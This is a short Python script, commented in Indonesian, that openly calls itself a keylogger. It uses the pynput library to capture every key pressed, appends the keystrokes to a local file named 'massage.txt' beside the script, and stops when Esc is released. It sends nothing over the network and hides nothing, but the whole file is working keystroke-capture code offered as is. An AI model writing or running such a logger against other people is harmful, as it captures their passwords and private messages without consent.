import os
from pynput.keyboard import Key, Listener

# Lokasi file log
log_file = os.path.join(os.path.dirname(__file__), 'massage.txt')

# Fungsi untuk menulis setiap tombol yang ditekan ke dalam file log
def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            else:
                f.write(f" [{key}] ")

# Fungsi untuk menghentikan keylogger jika tombol Esc ditekan
def on_release(key):
    if key == Key.esc:
        return False

# Fungsi untuk menjalankan keylogger
def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Jalankan keylogger
if __name__ == "__main__":
    start_keylogger()
